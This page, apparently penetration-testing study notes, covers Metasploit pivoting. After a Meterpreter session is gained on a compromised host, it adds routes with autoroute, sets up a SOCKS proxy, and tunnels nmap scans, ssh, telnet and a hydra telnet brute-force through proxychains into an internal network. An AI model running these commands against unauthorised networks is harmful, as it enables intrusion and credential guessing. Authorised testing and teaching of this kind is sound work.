<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Metasploit Dynamic Port Forwarding</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Metasploit Dynamic Port Forwarding</h1><br /><strong>Requirements:</strong><br />• Meterpreter
    session between attacker and pivot host<br />• Connectivity to the chosen SOCKS port <br /><br /><strong>1. Use an
      Exploit against the Pivot machine(Victim1) and gain a meterpreter session(sid)<br />2. Route all the traffic for
      victim2_network/netmask</strong><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&gt;&nbsp;run&nbsp;autoroute&nbsp;-s&nbsp;10.32.121.0/24<br />meterpreter&gt;&nbsp;run&nbsp;autoroute&nbsp;-p
      </div>
    </div><br /> <a href=""><img src="images/777-1.png" alt="images/777-1.png" /></a><br /><br />2.2 ALTERNATIVE:<br />
    <div class="codebox">
      <div class="codebox">
        msf&nbsp;&gt;&nbsp;route&nbsp;add&nbsp;[victim2_network]&nbsp;[netmask]&nbsp;[sid]<br />msf&nbsp;&gt;&nbsp;route&nbsp;print&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;check&nbsp;if&nbsp;the&nbsp;route&nbsp;is&nbsp;been&nbsp;added
      </div>
    </div><br /> <strong>explanation of
    </strong><strong><code>route add [victim2_network] [netmask] [sid]</code></strong><br /> ▪
    <code>[victim2_network]</code> → is the network where is victim2<br /> ▪ <code>netmask</code> → is a 32-bit
    &quot;mask&quot; used to define the subnet in the network (example: 255.255.225.0)<br /> ▪ <code>sid</code> →
    meterpreter session running (in this case the sid is of the victim1 machine)<br /> With this command we tell
    metasploit to route all the traffic intended to the network <code>victim2_network</code>/<code>netmask</code>,
    through the meterpreter session <code>sid</code>. <br /> In other words, all the traffic to
    <code>victim2_network</code>/<code>netmask</code> will be tunneled through Victim 1<br /><br />2.3
    <strong>ALTERNATIVE: Route all the traffic for victim2_network/netmask</strong> <br /> WARNING: as you can see can
    give some problem (mostly with windows) check above 2.1<br />
    <div class="codebox">
      <div class="codebox">
        msf&gt;&nbsp;use&nbsp;post/multi/manage/autoroute<br />msf&gt;&nbsp;set&nbsp;session&nbsp;[id]<br />msf&gt;&nbsp;set&nbsp;subnet&nbsp;10.32.121.0/24<br />msf&gt;&nbsp;run<br />msf&gt;&nbsp;route&nbsp;print
      </div>
    </div><br /> <a href=""><img src="images/777-2.png" alt="images/777-2.png" /></a><br /> attention to the output
    could not work <br /> <br /><strong>3. socks_proxy(socks4a) module in msf</strong><br /> socks4a is been
    removed<br />
    <div class="codebox">
      <div class="codebox">
        msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary/server/socks_proxy<br />msf&nbsp;auxiliary(server/socks_proxy)&nbsp;&gt;&nbsp;options<br />msf&nbsp;auxiliary(server/socks_proxy)&nbsp;&gt;&nbsp;set&nbsp;SRVHOST&nbsp;[attacker_ip_in_network]<br />msf&nbsp;auxiliary(server/socks_proxy)&nbsp;&gt;&nbsp;set&nbsp;SRVPORT&nbsp;1080&nbsp;&nbsp;#bind&nbsp;port&nbsp;1080&nbsp;on&nbsp;the&nbsp;VM&nbsp;running&nbsp;MSF<br />msf&nbsp;auxiliary(server/socks_proxy)&nbsp;&gt;&nbsp;set&nbsp;version&nbsp;4a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;we&nbsp;need&nbsp;to&nbsp;use&nbsp;&quot;socks4&quot;&nbsp;in&nbsp;proxychains.conf<br />#OR<br />msf&nbsp;auxiliary(server/socks_proxy)&nbsp;&gt;&nbsp;set&nbsp;version&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;we&nbsp;need&nbsp;to&nbsp;use&nbsp;&quot;socks5&quot;&nbsp;in&nbsp;proxychains.conf<br />msf&nbsp;auxiliary(server/socks_proxy)&nbsp;&gt;&nbsp;run
      </div>
    </div><br /> <br /><strong>4. configure proxychains</strong> <br /> Proxychains is a tool that forces any TCP
    connection made by any given application, to follow through proxy like SOCKS4, SOCKS5, TOR and so on...<br /> We
    have to configure proxychains to match the host(SRVHOST) the port(SRVPORT) that we choose for our proxy server when
    we have used the modul<br /> ◇ socks4<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;echo&nbsp;&quot;socks4&nbsp;[attacker_ip_in_network]&nbsp;1080&quot;&nbsp;&gt;&nbsp;/etc/proxychains.conf
      </div>
    </div><br /> <a href=""><img src="images/777-3.png" alt="images/777-3.png" /></a><br /> ◇ socks5<br /> <a
      href=""><img src="images/777-4.png" alt="images/777-4.png" /></a><br /><br /><br /><strong>5. Run commands through
      proxychains</strong><br /> Before the command we have to add <span
      style="text-decoration:underline;">proxychains</span> so the command will be forced to run through it.<br /> <span
      style="color:#a5452a;">examples:</span><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;<br />root@kali:/#&nbsp;proxychains&nbsp;-q&nbsp;nmap&nbsp;-sT&nbsp;-Pn&nbsp;-T5&nbsp;-n&nbsp;--top-ports&nbsp;100&nbsp;10.100.40.107&nbsp;&nbsp;#use&nbsp;-sT&nbsp;in&nbsp;proxychains,&nbsp;-sS&nbsp;could&nbsp;not&nbsp;work<br />root@kali:/#&nbsp;proxychains&nbsp;-q&nbsp;nmap&nbsp;-sTV&nbsp;-Pn&nbsp;-T5&nbsp;-n&nbsp;--top-ports&nbsp;100&nbsp;10.100.40.107&nbsp;&nbsp;&nbsp;#-sTV&nbsp;==&nbsp;-sT&nbsp;+&nbsp;-sV&nbsp;<br />root@kali:/#&nbsp;proxychains&nbsp;ssh&nbsp;192.168.1.23<br />root@kali:/#&nbsp;proxychains&nbsp;telnet&nbsp;192.168.1.23<br />root@kali:/#&nbsp;proxychains&nbsp;iceweasel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#access&nbsp;to&nbsp;internal&nbsp;website&nbsp;like&nbsp;if&nbsp;we&nbsp;are&nbsp;on&nbsp;victim&nbsp;machine<br />root@kali:/#&nbsp;proxychains&nbsp;-q&nbsp;hydra&nbsp;-C&nbsp;telnet.txt&nbsp;telnet://10.32.121.23&nbsp;-V&nbsp;|&amp;&nbsp;tee&nbsp;&nbsp;&nbsp;&nbsp;#with&nbsp;-V&nbsp;(verbose)&nbsp;could&nbsp;be&nbsp;too&nbsp;much&nbsp;verbose<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#mostly&nbsp;if&nbsp;we&nbsp;have&nbsp;a&nbsp;lot&nbsp;of&nbsp;combinations&nbsp;of&nbsp;user/password
      </div>
    </div><br /> proxychains could give us a lot of debug information...<br /> <a href=""><img src="images/777-5.png"
        alt="images/777-5.png" /></a><br /> to avoid that we could use the quiet mode (-q)<br />
    <div class="codebox">
      <div class="codebox">
        proxychains&nbsp;-q&nbsp;nmap&nbsp;-sT&nbsp;-Pn&nbsp;-n&nbsp;192.168.1.23&nbsp;--top-ports&nbsp;100</div>
    </div><br /> <br /> <strong>ATTENTION</strong>: with proxychains <span style="text-decoration:underline;">use
      always</span> the options “-sT -Pn” (also with scripts)<br /> <br />• if we see more requests in loop with nmap,
    is because we have used -sV that need to take more informations!<br /> <a href=""><img src="images/777-6.png"
        alt="images/777-6.png" /></a><br /> <a href=""><img src="images/777-7.png" alt="images/777-7.png" /></a><br />
    <br /> <br /> <br /><br />Bibliography:<br />• <a
      href="https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot" target="_blank">https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</a><br />•
    <a href="https://zaiste.net/posts/ssh-port-forwarding/" target="_blank">https://zaiste.net/posts/ssh-port-forwarding/</a><br />• <a
      href="https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229" target="_blank">https://pen-testing.sans.org/resources/papers/gwapt/tunneling-pivoting-web-application-penetration-testing-120229</a><br />
  </div>
</body>

</html>